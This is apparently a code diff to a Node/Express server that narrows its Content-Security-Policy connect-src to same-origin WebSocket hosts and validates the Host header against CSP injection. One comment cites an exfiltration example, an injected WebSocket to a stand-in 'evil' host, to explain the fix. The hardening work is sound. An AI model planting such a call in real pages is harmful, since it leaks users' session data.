@@ -7,13 +7,30 @@ import { authRejection, gateCheck } from '../auth/rate-limiter.js';   // 拒绝�
 
 export const clientIp = value => (value || '').toString().replace(/^::ffff:/, '');
 
-export function setSecurityHeaders(res) {
+// CSP 的 host-source 形态：主机名/IPv4/IPv6 字面量 + 可选端口。**故意不接受任何别的字符**——
+// Host 是客户端可控的，值里带分号/空格/引号就能往 CSP 里塞别的指令（只害到他自己那一个响应，
+// 但没有理由让一个畸形输入改写策略结构）。形状不对就当没有 Host（见下）。
+const CSP_HOST_RE = /^[A-Za-z0-9.-]+(:\d{1,5})?$|^\[[0-9A-Fa-f:]+\](:\d{1,5})?$/;
+
+export function setSecurityHeaders(res, hostHeader) {
+  // connect-src 原本是 `'self' ws: wss:`。裸的 scheme **不限主机**：CSP 的 script 那一层一旦被
+  // 突破一次（script-src 'self' 目前很紧，但纵深防的正是这一格），注入的脚本就能
+  // `new WebSocket('wss://evil/')` 把会话内容整段外带，而 connect-src 不拦（L2，2026-09-17 安全审查）。
+  //
+  // 【为什么按本页 Host 列出来，而不是只写 'self'】CSP3 规范里 'self' 应当覆盖同源的 ws/wss，
+  // 但 Safari 在这一格上历史有坑，而 iOS PWA 是本产品的主要目标之一——判错的后果是 socket
+  // 连不上、整个 app 在 iOS 上不可用。显式列出同源的 ws:// 与 wss:// 不依赖那条规范细节，
+  // 收紧程度完全一样：列的就是本页自己的源，攻击者伪造 Host 也只能列到他自己已经在的那个源。
+  //
+  // 取不到 Host（或形状不对）时回落成只有 'self'，**不是**回落成裸 scheme：失败方向是更严。
+  const host = String(hostHeader ?? '').trim();
+  const sameOriginWs = CSP_HOST_RE.test(host) ? ` ws://${host} wss://${host}` : '';
   res.setHeader('Content-Security-Policy', [
     "default-src 'self'",
     "script-src 'self'",
     "style-src 'self' 'unsafe-inline'",
     "img-src 'self' data:",
-    "connect-src 'self' ws: wss:",
+    `connect-src 'self'${sameOriginWs}`,
     "font-src 'self'",
     "frame-ancestors 'none'",
     // form-action 与 base-uri 都【不】回落到 default-src（CSP 规范），不显式声明即完全无限制：
@@ -235,8 +252,9 @@ export function configureHttpShell({
   // 而下面那个中间件跑在更早，那时头还不存在，在 setSecurityHeaders 里 removeHeader 抓不到它。
   app.disable('x-powered-by');
   app.use(compression());
-  app.use((_req, res, next) => {
-    setSecurityHeaders(res);
+  // 把 Host 传进去：connect-src 要按本页的源列出同源 ws/wss（见 setSecurityHeaders 头注）。
+  app.use((req, res, next) => {
+    setSecurityHeaders(res, req.headers?.host);
     next();
   });
 
